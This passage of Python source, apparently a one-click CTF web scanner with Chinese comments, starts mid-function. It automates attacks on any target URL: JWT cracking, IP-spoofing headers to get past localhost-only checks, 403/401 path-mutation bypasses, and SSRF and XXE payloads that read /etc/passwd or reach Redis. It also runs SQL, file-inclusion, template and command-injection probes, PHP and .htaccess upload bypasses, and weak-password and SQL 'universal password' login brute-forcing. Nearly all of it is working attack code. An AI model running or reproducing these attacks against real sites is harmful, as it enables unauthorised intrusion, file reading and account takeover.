                for line in _web.jwt_crack(tok)[:8]:
                    say("    " + str(line)[:140], "dim")
                # JWT 里解出来的 payload 可能直接有 flag
                for _p in _web.decode_jwt(tok) or []:
                    if isinstance(_p, str):
                        for _f in harvest(_p.encode("utf-8", "ignore")):
                            add_flag(_f, "JWT payload")
            except Exception as _e:
                say("    （JWT 爆破跳过：%s）" % str(_e)[:60], "dim")
    for f in harvest(base["body"]):
        add_flag(f, "首页")
    say("")

    # ---------- 1.5 源码深度分析（简单题的 flag 大多在这）
    try:
        deep_source(u, base, say, add_flag, take, timeout)
    except Exception as e:
        say(f"  源码分析跳过：{e}", "dim")
        say("")

    # ---------- 2. 敏感文件 / 目录
    say("== 1.5 CMS 指纹 / 安全配置 ==", "h")
    try:
        fingerprint_cms(u, say, take, timeout)
        probe_security_headers(u, say, take, timeout)
        probe_http_methods(u, say, take, timeout)
    except Exception as e:
        say(f"  （跳过：{e}）", "dim")

    # 1.6) 本地访问绕过：伪造 X-Forwarded-For 等头，骗过后端「仅限本地」
    say("== 1.6 本地访问绕过（伪造 IP）==", "h")
    try:
        import webreq
        import misc as _misc

        def _http_adapter(url, method="GET", headers=None, data=None, timeout=6):
            return _http(url, method=method, headers=headers, data=data,
                         timeout=timeout)

        sp = webreq.spoof_local(
            u, _http_adapter, take, say, add_flag, timeout=timeout,
            find_flags=_misc.find_flags_in)
        if sp.get("flags"):
            rep["flags"] += [x for x in sp["flags"] if x not in rep["flags"]]
    except Exception as e:
        say(f"  （跳过：{e}）", "dim")

    say("== 2. 敏感文件 / 源码泄露 / 备份包 ==", "h")
    # 先把 robots.txt / sitemap.xml 里给的路径抓出来，合进待扫目标 ——
    # 题目常把真正的入口藏在这两个文件里
    try:
        for _p in ("robots.txt", "sitemap.xml", "sitemap.txt"):
            if not take():
                break
            _r = _http(base_dir.rstrip("/") + "/" + _p, timeout=timeout)
            if _r["status"] == 200 and _r["len"]:
                xp = extract_paths_from(_text(_r))
                if xp:
                    for _f in xp:
                        if _f not in FILES:
                            # 插到最前面：这两个文件给出的路径基本都是作者手动藏的，
                            # 优先级比通用字典高，不能被预算上限挤掉
                            FILES.insert(0, _f)
                    say(f"  {_p} 里发现 {len(xp)} 个路径，已并入扫描目标（优先扫）")
    except Exception:
        pass
    all_targets = [base_dir.rstrip("/") + "/" + f for f in FILES]
    if deep:
        # 路径库有 200+ 条，但不能把预算全占光：
        # 表单弱口令是整个流程里最可能直接出 flag 的一步，必须给它留够请求
        cap = max(40, int(max_req * 0.5))
        targets = all_targets[:cap]
    else:
        targets = all_targets[:24]
    results = []

    def probe(path_url):
        if not take():
            return None
        r = _http(path_url, timeout=timeout)
        return (path_url, r)

    done = 0
    total = len(targets)
    with ThreadPoolExecutor(max_workers=threads) as ex:
        futs = {ex.submit(probe, t): t for t in targets}
        for fu in as_completed(futs):
            done += 1
            if progress and done % 10 == 0:
                progress(done, total, "探测敏感文件")
            item = fu.result()
            if item:
                results.append(item)

    discovered = set()
    blocked_paths = []
    # ---------- 2.5 目录列表递归：Index of 页面直接暴露全部内容

    if budget["n"] < max_req * 0.75:

        for path_url, r in list(results):

            if r["error"] or not r["status"] or r["status"] != 200:

                continue

            if b"index of /" not in r["body"][:4096].lower():

                continue

            for href in re.findall(rb'<a\s+[^>]*href\s*=\s*["\']([^"\'?#]+)["\']',

                                  r["body"][:60000], re.I):

                sub = urllib.parse.urljoin(path_url, href.decode("latin-1"))

                sub = urllib.parse.urlsplit(sub).path

                if not sub or sub.startswith("..") or sub in discovered:

                    continue

                discovered.add(sub)

                r2 = _http(base_dir.rstrip("/") + sub, timeout=timeout)

                if r2["status"] in (200, 206) and r2["len"]:

                    add_flag_from(r2, "目录 " + sub, add_flag)

                    for f in harvest(_text(r2), sub):

                        add_flag(f, "目录 " + sub)

                    say(f"    。{sub}（{r2[chr(39)+chr(108)+chr(101)+chr(110)+chr(39)]} 字节）", "ok")


    interesting = []
    for path_url, r in sorted(results, key=lambda x: x[0]):
        if r["error"] or not r["status"]:
            continue
        rel = path_url[len(base_dir):] if path_url.startswith(base_dir) else path_url
        st = r["status"]
        body = r["body"]
        # 200 且有内容
        if st == 200 and r["len"] > 0:
            kind = ""
            low = body[:2048].lower()
            if rel.endswith(".zip") or low[:2] == b"pk":
                kind = "压缩包（下载下来解，可能就是源码）"
            elif rel.endswith((".tar.gz", ".tar")):
                kind = "tar 包"
            elif rel.endswith((".rar",)):
                kind = "rar 包"
            elif b"index of /" in low:
                kind = "★ 目录可浏览（挨个点进去看）"
            elif b"root:x:0:0" in low:
                kind = "★ /etc/passwd（目录穿越成功）"
            elif low.startswith(b"<?php") or b"<?php" in low[:200]:
                kind = "★ PHP 源码泄露"
            elif rel.endswith(".git/head") or low.startswith(b"ref:"):
                kind = "★ Git 仓库暴露（用 githacker 一键还原源码）"
            elif b"bud1" in low[:16]:
                kind = "★ .DS_Store（能列出目录结构）"
            elif b"<html" in low or b"<!doctype" in low:
                kind = "页面存在"
            else:
                kind = "有内容"
            interesting.append((rel, st, r["len"], kind))
            for f in harvest(body):
                add_flag(f, rel)
        elif st in (401, 403):
            interesting.append((rel, st, r["len"], "存在但禁止访问（下面会自动试绕过）"))
            blocked_paths.append(rel)
        elif st in (301, 302) and r["headers"].get("location"):
            interesting.append((rel, st, r["len"],
                                "跳转到 " + r["headers"]["location"][:60]))
        elif st == 500:
            interesting.append((rel, st, r["len"], "500（备份/畸形文件常触发，值得手看）"))

    if interesting:
        for rel, st, ln, kind in interesting[:40]:
            tag = "ok" if kind.startswith("★") else ""
            say(f"  [{st}] {rel:32} {ln:>7}B  {kind}", tag)
            rep["findings"].append({"type": "path", "path": rel, "status": st,
                                    "len": ln, "note": kind})
    else:
        say("  没探到敏感文件（换更细的字典，或者题目不在这一层）", "dim")
    say(f"  （共探测 {budget['n']} 个请求）", "dim")
    say("")

    # 2.5 备份后缀：index.php → index.php.bak / .swp / .zip，拿源码最快的一招
    if budget["n"] < max_req * 0.65:
        try:
            probe_backup_suffixes(u, discovered, say, take, add_flag, timeout)
        except Exception:
            pass

    # 2.6 robots.txt / sitemap.xml 里给的路径，再补扫一遍
    if budget["n"] < max_req * 0.75:
        try:
            extra_paths = set()
            for _p in ("robots.txt", "sitemap.xml"):
                if not take():
                    break
                _r = _http(base_dir.rstrip("/") + "/" + _p, timeout=timeout)
                if _r["status"] == 200 and _r["len"]:
                    extra_paths |= extract_paths_from(_text(_r))
            if extra_paths:
                say(f"  robots/sitemap 里发现 {len(extra_paths)} 个路径，正在补扫……")
                for path_url in [base_dir.rstrip("/") + x
                                 for x in sorted(extra_paths)[:60]]:
                    if not take():
                        break
                    r = _http(path_url, timeout=timeout)
                    if r["status"] in (200, 206) and r["len"]:
                        rel = urllib.parse.urlsplit(path_url).path
                        add_flag_from(r, "robots " + rel, add_flag)
                        for f in harvest(_text(r), rel):
                            add_flag(f, "robots " + rel)
                        say(f"    {rel}（{r['len']} 字节）", "ok")
                        discovered.add(rel)
        except Exception:
            pass

    # ---------- 2.6 403 / 401 绕过
    try:
        probe_403_bypass(base_dir, blocked_paths, _http, take, say, add_flag,
                         timeout=timeout, find_flags=_misc_find_flags())
    except Exception as e:
        say(f"  （403 绕过跳过：{e}）", "dim")

    # ---------- 3. 参数注入（拿到 flag 也继续跑，避免被假 flag 骗过去）
    if deep and budget["n"] < max_req * 0.8:
        say("== 3. 参数注入 ==", "h")
        params = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
        if params:
            for k, v in params:
                say(f"  探测参数 {k} = {v!r}")
                _probe_param(u, k, v, base, say, take, add_flag, timeout)
        else:
            # 没有参数就试几个最常见的名字
            common = ["id", "page", "file", "path", "url", "name", "cmd", "search", "q"]
            say("  URL 没有参数，试常见参数名：" + ", ".join(common), "dim")
            for k in common[:5]:
                _probe_param(u, k, "1", base, say, take, add_flag, timeout)
        say("")

    # ---------- 3.6 SSRF 参数注入
    if deep:
        try:
            _params = urllib.parse.parse_qsl(p.query, keep_blank_values=True)
            probe_ssrf(u, _params, _http, take, say, add_flag,
                       timeout=timeout, find_flags=_misc_find_flags())
        except Exception as e:
            say(f"  （SSRF 跳过：{e}）", "dim")

    # ---------- 3.7 XXE（只在有 XML 迹象时跑）
    if deep:
        try:
            probe_xxe(u, _http, take_extra, say, add_flag, timeout=timeout,
                      find_flags=_misc_find_flags(),
                      page_text=(_text(base) if base else ""))
        except Exception as e:
            say(f"  （XXE 跳过：{e}）", "dim")

    # ---------- 4. 表单
    if deep:
        say("== 4. 表单（弱口令 / 万能密码）==", "h")
        forms = _find_forms(_text(base), u)
        # 目标页不一定带登录框，再抓一次站点根目录（大多数 CMS 的登录框在 / 或 /admin）
        if take():
            try:
                _rr = _http(root, timeout=timeout)
                if _rr["status"] in (200, 206) and _rr["len"]:
                    for _f in _find_forms(_text(_rr), root):
                        if _f not in forms:
                            forms.append(_f)
                            add_flag_from(_rr, "根目录", add_flag)
            except Exception:
                pass
        if not forms:
            say("  首页没找到表单", "dim")
        # 表单爆破是整个流程里最可能直接出 flag 的一步，
        # 给它独立请求额度（40 个），不受前面路径/注入探测的预算影响
        spare = {"n": 0}

        def take_form():
            spare["n"] += 1
            return spare["n"] <= 40 and (time.time() - t0 < time_limit)

        for fm in forms[:3]:
            _try_form(fm, say, take_form, add_flag, timeout)
        say("")

        # 4.5) 有文件上传框就试绕过
        ups = [f for f in forms if f.get("file_fields")]
        if ups:
            try:
                for fm in ups[:2]:
                    probe_upload(u, fm, _http, take_extra, say, add_flag,
                                 timeout=timeout, find_flags=_misc_find_flags())
            except Exception as e:
                say(f"  （上传绕过跳过：{e}）", "dim")

    # ---------- 5. 汇总
    say("=" * 62, "dim")
    if rep["flags"]:
        say(f"★ 拿到 {len(rep['flags'])} 个 flag", "ok")
    else:
        say("没直接拿到 flag。下一步建议：", "warn")
        say("  · 上面列出的可疑路径手动点开看看（尤其 403 和 500 的）")
        say("  · 有 .git 就用 githacker --url <URL>/.git/ --output ./src 还原源码")
        say("  · 有 www.zip 就下下来解，源码里搜 flag")
        say("  · ④ Web 面板生成 ffuf / sqlmap 命令，配大字典继续")
    say(f"总请求 {budget['n']} 个，耗时 {time.time() - t0:.1f} 秒", "dim")
    rep["stats"] = {"requests": budget["n"], "elapsed": time.time() - t0}
    return rep


# ------------------------------------------------------------------ 参数探测
# ---------------------------------------------------------------- 403 绕过
# 403/401 不代表进不去，路径变形经常能骗过前置的 WAF / 路由规则
BYPASS_MUTATIONS = [
    # (变形方式, 说明)
    ("{p}/.", "末尾加 /."),
    ("{p}/", "末尾加斜杠"),
    ("{p}//", "双斜杠结尾"),
    ("{p}/./", "中间插 /./"),
    ("//{p}", "开头双斜杠"),
    ("/./{p}", "开头 /./"),
    ("/{p}", "多余的前导斜杠"),
    ("{p}/..;/", "分号绕过 ..;/"),
    ("{p}/..;/{p}", "..;/ 重复路径"),
    ("/{p}/..;/", "前导 + 分号"),
    ("{p}%2f", "%2f 编码斜杠"),
    ("{p}%252f", "双重编码 %252f"),
    ("{p}%20", "末尾空格编码"),
    ("{p}%09", "末尾 tab 编码"),
    ("{p}?", "加空查询串"),
    ("{p}#", "加井号"),
    ("{p}/..", "末尾 /.."),
    ("{p}~", "末尾波浪号"),
    ("{p};", "末尾分号"),
]


def _case_variants(p):
    """大小写变形（WAF 常只匹配小写）"""
    out = []
    for i in range(len(p)):
        if p[i].isalpha():
            out.append(p[:i] + p[i].upper() + p[i + 1:])
            break
    out.append(p.upper())
    return out


def probe_403_bypass(base_dir, blocked, http, take, say, add_flag,
                     timeout=6, find_flags=None, limit_paths=3, limit_tries=60):
    """
    对 403/401 的路径试各种变形。blocked 是相对路径列表，如 ["admin/", ".git/config"]。
    返回找到的 flag 列表。
    """
    found = []
    if not blocked:
        return found
    say("")
    say("== 2.6 403 / 401 绕过 ==", "h")
    tried = 0
    for rel in blocked[:limit_paths]:
        p = "/" + rel.lstrip("/").rstrip("/")
        cands = []
        for tpl, why in BYPASS_MUTATIONS:
            cands.append((tpl.format(p=p), why))
        for cv in _case_variants(p):
            if cv != p:
                cands.append((cv, "大小写变形"))
        for cand, why in cands:
            if not take() or tried >= limit_tries:
                break
            tried += 1
            r = http(base_dir.rstrip("/") + cand, timeout=timeout)
            if r.get("error") or r.get("status") not in (200, 201, 204, 206):
                continue
            if (r.get("len") or 0) < 10:
                continue
            hit = []
            if find_flags:
                h, _c = find_flags(r.get("body") or b"")
                hit = [x.decode("utf-8", "ignore") for x in h]
            if hit:
                for f in hit:
                    if f not in found:
                        found.append(f)
                        add_flag(f, "403 绕过 " + cand)
                say(f"  ★★ {cand}（{why}）→ HTTP {r['status']}，拿到 flag", "ok")
            else:
                say(f"  ★ {cand}（{why}）→ HTTP {r['status']}，{r.get('len')} 字节"
                    f"（能访问了，手动看内容）", "warn")
            break        # 这个路径找到一条能用的就够了
        if tried >= limit_tries:
            break
    if not found and tried:
        say(f"  试了 {tried} 种变形，没绕进去", "dim")
    return found


# ---------------------------------------------------------------- SSRF 参数注入
# 参数名像「要访问的地址」时，往里面塞内网地址
SSRF_PARAM_HINTS = (
    "url", "uri", "link", "src", "source", "dest", "destination", "target",
    "redirect", "return", "next", "callback", "continue", "goto", "out",
    "ip", "host", "hostname", "domain", "site", "server", "addr",
    "path", "file", "filename", "page", "view", "load", "read", "fetch",
    "img", "image", "pic", "avatar", "proxy", "request", "api", "feed",
    "u", "r", "s", "f", "p",
)

SSRF_PAYLOADS = [
    ("http://127.0.0.1/", "直连本地根"),
    ("http://127.0.0.1:80/", "本地 80"),
    ("http://localhost/", "localhost"),
    ("http://127.0.0.1/flag", "猜 /flag"),
    ("http://127.0.0.1/admin", "猜 /admin"),
    ("http://[::1]/", "IPv6 本地"),
    ("file:///etc/passwd", "file 协议读文件"),
    ("file:///c:/windows/win.ini", "file 协议读 win.ini"),
    ("php://filter/convert.base64-encode/resource=index.php", "PHP 伪协议读源码"),
    ("dict://127.0.0.1:6379/info", "dict 打 Redis"),
    ("gopher://127.0.0.1:6379/_INFO", "gopher 打 Redis"),
]


def probe_ssrf(url, params, http, take, say, add_flag, timeout=6,
               find_flags=None, limit_tries=40):
    """
    对「像地址」的参数注入 SSRF payload。
    params 是 [(name, value)]，返回找到的 flag。
    """
    found = []
    hits = [(k, v) for k, v in params if k.lower() in SSRF_PARAM_HINTS]
    if not hits:
        return found
    say("")
    say("== 3.6 SSRF 参数注入 ==", "h")
    say("  参数名像地址：" + ", ".join(k for k, _v in hits[:8]))
    tried = 0
    base_url = url.split("?", 1)[0]
    for k, _old in hits[:6]:
        for payload, why in SSRF_PAYLOADS:
            if not take() or tried >= limit_tries:
                break
            tried += 1
            target = _set_query(base_url, k, payload)
            r = http(target, timeout=timeout)
            if r.get("error") or not r.get("status"):
                continue
            body = r.get("body") or b""
            hit = []
            if find_flags:
                h, _c = find_flags(body)
                hit = [x.decode("utf-8", "ignore") for x in h]
            if hit:
                for f in hit:
                    if f not in found:
                        found.append(f)
                        add_flag(f, f"SSRF {k}={payload[:40]}")
                say(f"  ★★ {k}={payload[:44]}（{why}）→ 拿到 flag", "ok")
            # 命中特征
            low = body[:3000].lower()
            if b"root:x:0:0" in body:
                say(f"  ★ {k}={payload[:40]} → 读到 /etc/passwd！", "ok")
            elif b"[extensions]" in low or b"for 16-bit app support" in low:
                say(f"  ★ {k}={payload[:40]} → 读到 win.ini！", "ok")
            elif b"redis_version" in low:
                say(f"  ★ {k}={payload[:40]} → 打通 Redis！", "ok")
        if tried >= limit_tries:
            break
    if not found and tried:
        say(f"  试了 {tried} 个 SSRF payload，没直接出 flag", "dim")
    return found


def _misc_find_flags():
    """懒加载 misc.find_flags_in（避免模块循环导入）"""
    try:
        import misc
        return misc.find_flags_in
    except Exception:
        return None


def _probe_param(url, param, value, base, say, take, add_flag, timeout):
    base_txt = _text(base)
    base_len = base["len"]

    def hit(kind, detail, evidence=""):
        say(f"    ★ {kind}：{detail}", "ok")
        if evidence:
            say(f"      证据：{evidence[:120]}", "dim")

    # --- SQL 报错
    for payload, name in SQLI_ERROR:
        if not take():
            return
        r = _http(_set_query(url, param, payload), timeout=timeout)
        t = _text(r)
        for kw in SQL_ERRORS:
            if kw.lower() in t.lower():
                hit("SQL 注入（报错型）", f"{name} 触发了数据库报错", _snippet(t, kw))
                add_flag_from(r, f"{param}={payload}", add_flag)
                return
        for f in harvest(r["body"]):
            add_flag(f, f"{param}={payload}")

    # --- SQL 布尔盲注：and 1=1 与 and 1=2 长度差异
    for p1, p2 in SQLI_BOOL:
        if not take():
            return
        r1 = _http(_set_query(url, param, p1), timeout=timeout)
        if not take():
            return
        r2 = _http(_set_query(url, param, p2), timeout=timeout)
        if r1["status"] == 200 and r2["status"] == 200:
            d = abs(r1["len"] - r2["len"])
            if d > max(30, base_len * 0.1):
                hit("SQL 注入（布尔盲注）",
                    f"`{p1}` 与 `{p2}` 返回长度差 {d} 字节（{r1['len']} vs {r2['len']}）")
                break

    # --- LFI / 目录穿越 / PHP 伪协议
    for payload, name in LFI_PAYLOADS:
        if not take():
            return
        r = _http(_set_query(url, param, payload), timeout=timeout)
        t = _text(r)
        if "root:x:0:0" in t or "root:*:0:0" in t:
            hit("文件读取 / 目录穿越", f"{name} 读到了 /etc/passwd", "root:x:0:0")
            return
        if "[fonts]" in t or "[extensions]" in t:
            hit("文件读取 / 目录穿越", f"{name} 读到了 win.ini", "[fonts]")
            return
        # php://filter 出来是 base64
        for m in re.finditer(r"[A-Za-z0-9+/]{40,}={0,2}", t):
            try:
                dec = base64.b64decode(m.group() + "=" * ((-len(m.group())) % 4))
            except Exception:
                continue
            if b"<?php" in dec:
                hit("PHP 伪协议读源码", f"{name} 读到了 PHP 源码", dec[:100].decode("utf-8", "ignore"))
                h, _ = find_flags_in(dec)
                for x in h:
                    add_flag(x.decode("utf-8", "ignore"), f"{param}=php://filter")
                return
        for f in harvest(r["body"]):
            add_flag(f, f"{param}={payload}")

    # --- SSTI：{{7*7}} → 49，再用 {{7*8}} → 56 确认不是巧合
    for p1, p2, name in SSTI_PAYLOADS:
        if not take():
            return
        r1 = _http(_set_query(url, param, p1), timeout=timeout)
        if not take():
            return
        r2 = _http(_set_query(url, param, p2), timeout=timeout)
        t1, t2 = _text(r1), _text(r2)
        if ("49" in t1 and "56" in t2 and "49" not in base_txt):
            hit("SSTI 模板注入", f"{name}：{p1} → 49，{p2} → 56")
            return

    # --- 命令注入
    for payload, name in CMD_PAYLOADS:
        if not take():
            return
        r = _http(_set_query(url, param, payload), timeout=timeout)
        t = _text(r)
        m = re.search(r"uid=\d+\([^)]+\)\s+gid=\d+", t)
        if m:
            hit("命令注入", f"{name} 执行成功", m.group())
            add_flag_from(r, f"{param}={payload}", add_flag)
            return
        if re.search(r"^\s*flag\{", t, re.M) or "flag{" in t:
            for f in harvest(r["body"]):
                add_flag(f, f"{param}={payload}")

    # --- XSS 反射
    if take():
        r = _http(_set_query(url, param, XSS_PAYLOAD), timeout=timeout)
        if XSS_PAYLOAD in _text(r):
            say("    · XSS：payload 原样反射（CTF 里常配合 bot 打 cookie）", "warn")


def add_flag_from(resp, where, add_flag):
    for f in harvest(resp["body"]):
        add_flag(f, where)


def _snippet(text, kw, n=90):
    i = text.lower().find(kw.lower())
    if i < 0:
        return ""
    return text[max(0, i - 20):i + n].replace("\n", " ")


# ------------------------------------------------------------------ 表单
# ---------------------------------------------------------------- 文件上传绕过
# 上传点常见的黑名单绕过：改后缀 / 改 Content-Type / 加魔法字节 / 双写
UPLOAD_BYPASSES = [
    ("shell.php", "<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", "直接传 .php"),
    ("shell.php5", "<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", ".php5 后缀"),
    ("shell.phtml", "<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", ".phtml 后缀"),
    ("shell.php3", "<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", ".php3 后缀"),
    ("shell.pHp", "<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", "大小写混写 .pHp"),
    ("shell.jpg.php", "<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", "双后缀 .jpg.php"),
    ("shell.php.jpg", "<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", "双后缀 .php.jpg"),
    ("shell.php.jpg", "<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", "同上+伪造 jpg"),
    ("shell.php\x00.jpg", "<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", "%00 截断"),
    ("shell.gif", "GIF89a<?php echo 'CTF_UPLOAD_OK'; ?>", "image/gif", "GIF 魔法字节 + php"),
    (".htaccess", "AddType application/x-httpd-php .jpg\n", "text/plain", ".htaccess 让 jpg 当 php"),
    ("shell.jpg", "GIF89a<?php echo 'CTF_UPLOAD_OK'; ?>", "image/jpeg", "jpg + php 代码"),
]


def _multipart(field, filename, content, ctype, extra=None):
    """手工拼 multipart/form-data body"""
    bd = "----CTFOneClickBoundary7MA4YWxkTrZu0gW"
    body = []
    for k, v in (extra or {}).items():
        body.append("--" + bd)
        body.append('Content-Disposition: form-data; name="%s"' % k)
        body.append("")
        body.append(v)
    body.append("--" + bd)
    body.append('Content-Disposition: form-data; name="%s"; filename="%s"'
                % (field, filename))
    body.append("Content-Type: %s" % ctype)
    body.append("")
    body.append(content)
    body.append("--" + bd + "--")
    body.append("")
    raw = "\r\n".join(body).encode("utf-8", "ignore")
    return raw, "multipart/form-data; boundary=" + bd


def probe_upload(url, form, http, take, say, add_flag, timeout=8,
                 find_flags=None, limit_tries=14):
    """
    对一个文件上传表单试绕过。只上传「只会打印一个标记」的无害文件，
    不会在目标上留后门。
    """
    found = []
    field = (form.get("file_fields") or ["file"])[0]
    action = form.get("action") or url
    say("")
    say("== 4.5 文件上传绕过 ==", "h")
    say("  上传点：%s  字段 %s" % (action[:70], field))

    ok_any = False
    for filename, content, ctype, why in UPLOAD_BYPASSES:
        if not take() or len(found) >= limit_tries:
            break
        raw, ct = _multipart(field, filename, content, ctype)
        r = http(action, method="POST", headers={"Content-Type": ct},
                 data=raw, timeout=timeout)
        if r.get("error") or not r.get("status"):
            continue
        body = r.get("body") or b""
        if find_flags:
            h, _c = find_flags(body)
            for x in h:
                f = x.decode("utf-8", "ignore")
                if f not in found:
                    found.append(f)
                    add_flag(f, "上传 %s（%s）" % (filename, why))
            if found:
                say(f"  ★★ 传 {filename}（{why}）→ 回显里有 flag", "ok")
                return found
        # 上传成功 / 被拦的迹象
        low = body[:4000].lower()
        if b"ctf_upload_ok" in low:
            say(f"  ★★ 传 {filename}（{why}）→ 服务端执行了！", "ok")
            ok_any = True
        elif b"success" in low or "上传成功".encode("utf-8") in body or b"uploaded" in low:
            say(f"  ★ {filename}（{why}）→ 上传成功，试着访问一下", "warn")
            ok_any = True
        elif any(k in low for k in (b"not allowed", b"invalid", "不允许".encode("utf-8"),
                                    "禁止".encode("utf-8"), b"illegal", b"forbidden")):
            pass          # 被拦，正常
    if not found:
        if ok_any:
            say("  有文件传上去了，但没直接出 flag —— 手动找一下访问路径"
                "（常见 /uploads/、/upload/、同名目录）", "warn")
        else:
            say("  上传绕过没成功（可能后端做了内容检测或白名单）", "dim")
    return found


# ---------------------------------------------------------------- XXE
XXE_PAYLOADS = [
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
     '<r>&x;</r>', "经典 XXE 读 /etc/passwd"),
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///c:/windows/win.ini">]>'
     '<r>&x;</r>', "读 win.ini（Windows）"),
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>'
     '<r>&x;</r>', "PHP 伪协议读源码"),
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % f SYSTEM "file:///etc/passwd">'
     '<!ENTITY x "%f;">]><r>&x;</r>', "参数实体"),
    ('<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///flag">]><r>&x;</r>',
     "读 /flag"),
]

XXE_HINTS = ("xml", "soap", "wsdl", "rss", "atom", "text/xml",
             "application/xml", "xmlrpc")


def probe_xxe(url, http, take, say, add_flag, timeout=8, find_flags=None,
              page_text=""):
    """
    试 XXE。只有在页面/URL 有 XML 迹象时才跑，避免乱发请求。
    """
    found = []
    low_url = url.lower()
    low_txt = (page_text or "")[:4000].lower()
    hinted = (any(h in low_url for h in (".xml", ".do", ".action", "soap", "xmlrpc"))
              or any(h in low_txt for h in XXE_HINTS))
    if not hinted:
        return found
    say("")
    say("== 3.7 XXE ==", "h")
    for payload, why in XXE_PAYLOADS:
        if not take():
            break
        r = http(url, method="POST",
                 headers={"Content-Type": "application/xml"},
                 data=payload.encode(), timeout=timeout)
        if r.get("error") or not r.get("status"):
            continue
        body = r.get("body") or b""
        hit = False
        if b"root:x:0:0" in body:
            say(f"  ★★ {why} → 读到 /etc/passwd！", "ok")
            hit = True
        elif b"[extensions]" in body or b"for 16-bit app support" in body.lower():
            say(f"  ★★ {why} → 读到 win.ini！", "ok")
            hit = True
        elif b"PD9waHA" in body or b"<?php" in body:
            say(f"  ★ {why} → 疑似读到源码（base64 或原文）", "ok")
            hit = True
        if find_flags:
            h, _c = find_flags(body)
            for x in h:
                f = x.decode("utf-8", "ignore")
                if f not in found:
                    found.append(f)
                    add_flag(f, "XXE（%s）" % why)
                    say(f"  ★★ {why} → 回显里有 flag：{f}", "ok")
                    hit = True
        if found:
            break
    if not found:
        say("  试了 %d 种 XXE payload，没读到东西（可能没解析 XML 或有防护）"
            % len(XXE_PAYLOADS), "dim")
    return found


def _find_forms(html, page_url):
    """从 HTML 里抠出表单（action / method / input 名）"""
    forms = []
    for m in re.finditer(r"<form\b([^>]*)>(.*?)</form>", html, re.I | re.S):
        attrs, inner = m.group(1), m.group(2)
        action = re.search(r'action\s*=\s*["\']([^"\']*)["\']', attrs, re.I)
        method = re.search(r'method\s*=\s*["\']([^"\']*)["\']', attrs, re.I)
        action = action.group(1) if action else ""
        method = (method.group(1) if method else "get").upper()
        names = re.findall(r'<input\b[^>]*name\s*=\s*["\']([^"\']+)["\']', inner, re.I)
        types = re.findall(r'<input\b[^>]*type\s*=\s*["\']([^"\']+)["\']', inner, re.I)
        enc = re.search(r'enctype\s*=\s*["\']([^"\']*)["\']', attrs, re.I)
        # 找出 type=file 的字段名
        file_fields = re.findall(
            r'<input\b[^>]*type\s*=\s*["\']file["\'][^>]*>', inner, re.I)
        ff_names = []
        for tag in file_fields:
            nm = re.search(r'name\s*=\s*["\']([^"\']+)["\']', tag, re.I)
            ff_names.append(nm.group(1) if nm else "file")
        if not names and not ff_names:
            continue
        forms.append({
            "action": urllib.parse.urljoin(page_url, action) if action else page_url,
            "method": method,
            "names": names,
            "types": types,
            "enctype": (enc.group(1) if enc else "").lower(),
            "file_fields": ff_names,
        })
    return forms


def _try_form(fm, say, take, add_flag, timeout):
    names = fm["names"]
    say(f"  表单 {fm['method']} {fm['action'][:70]}  字段 {names}")
    # 猜用户名/密码字段
    user_key = next((n for n in names if re.search(r"user|name|account|login|email", n, re.I)), None)
    pass_key = next((n for n in names if re.search(r"pass|pwd|secret|token", n, re.I)), None)
    if not user_key or not pass_key:
        say("    不是登录表单，跳过弱口令", "dim")
        return

    trials = [
        ("admin", "admin"), ("admin", "123456"), ("admin", "password"),
        ("admin", "admin888"), ("root", "root"), ("test", "test"),
        ("admin' or '1'='1", "x"), ("admin'-- -", "x"),
        ("' or 1=1-- -", "x"), ("admin'#", "x"),
    ]
    base = _http(fm["action"], "GET", timeout=timeout) if fm["method"] == "GET" else \
        _http(fm["action"], "POST", {n: "x" for n in names}, timeout=timeout)
    base_txt = _text(base)

    for u_, p_ in trials:
        if not take():
            return
        data = {}
        for n in names:
            if n == user_key:
                data[n] = u_
            elif n == pass_key:
                data[n] = p_
            else:
                data[n] = "1"
        if fm["method"] == "GET":
            target = fm["action"] + ("&" if "?" in fm["action"] else "?") + urllib.parse.urlencode(data)
            r = _http(target, "GET", timeout=timeout)
        else:
            r = _http(fm["action"], "POST", data, timeout=timeout)
        t = _text(r)
        for f in harvest(r["body"]):
            add_flag(f, f"表单 {u_}/{p_}")
        # 成功判据：出现 flag / 跳转 / 成功关键词 / 长度明显变化
        if r["status"] in (301, 302) or re.search(
                r"welcome|success|登录成功|欢迎|dashboard|logout|flag\{", t, re.I):
            say(f"    ★ 弱口令命中：{u_} / {p_}  → HTTP {r['status']}", "ok")
            return
        if re.search(r"error|failed|失败|密码错误|invalid", t, re.I) and \
                len(t) < len(base_txt) * 0.6:
            continue
    say("    常见弱口令 / 万能密码没进去", "dim")


# ------------------------------------------------------------------ 命令行
def main():
    import sys
    if len(sys.argv) < 2:
        print('用法: python webscan.py http://目标地址/ [--quick]')
        return
    u = sys.argv[1]
    quick = "--quick" in sys.argv
    r = scan(u, deep=not quick)
    for line, _tag in r["lines"]:
        print(line)
    if r["flags"]:
        print("\nFLAGS:", r["flags"])


if __name__ == "__main__":
    main()
